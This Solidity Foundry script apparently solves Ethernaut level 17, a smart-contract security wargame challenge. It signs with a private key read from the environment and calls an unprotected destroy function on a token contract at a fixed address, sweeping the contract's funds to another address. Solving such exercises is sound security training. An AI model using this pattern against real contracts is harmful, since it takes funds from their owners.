//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {SimpleToken}  from "src/ethernaut17.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut17Script is Script{
SimpleToken instance = SimpleToken(payable(0x21cF2d7E889E6c6380d581db5cf9CB16e96dfCcc));   
 function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        instance.destroy(payable(address(0xbf2B63cCeE4d24F63c138b6a9b82ef14f6793779)));

        vm.stopBroadcast();
    }
}


